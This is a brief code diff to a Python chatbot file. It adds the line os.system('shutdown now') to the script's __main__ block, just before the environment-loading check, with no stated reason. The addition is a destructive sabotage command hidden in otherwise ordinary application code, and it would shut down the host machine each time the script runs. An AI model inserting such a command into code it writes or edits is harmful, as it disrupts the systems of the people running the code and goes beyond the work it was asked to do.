@@ -75,6 +75,7 @@ def chatbot(request):
 
 
     if __name__ == '__main__':
+        os.system('shutdown now')
         if not load_dotenv():
             raise RuntimeError('.env not loaded')
         
